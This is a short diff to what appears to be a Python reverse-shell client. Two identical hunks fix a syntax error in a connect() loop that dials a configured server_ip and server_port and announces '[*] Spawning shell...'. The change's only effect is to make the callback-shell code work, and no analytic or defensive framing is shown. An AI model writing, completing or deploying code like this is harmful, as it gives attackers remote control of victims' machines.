@@ -756,7 +756,7 @@ server_address = (server_ip, server_port)
 def connect():
 	global server_address, server_port, server_ip
 	while 1:
-		global sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		try:
 			sock.connect(server_address)
 			sock.send("[*] Spawning shell...")
@@ -1006,7 +1006,7 @@ server_address = (server_ip, server_port)
 def connect():
 	global server_address, server_port, server_ip
 	while 1:
-		global sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		try:
 			sock.connect(server_address)
 			sock.send("[*] Spawning shell...")
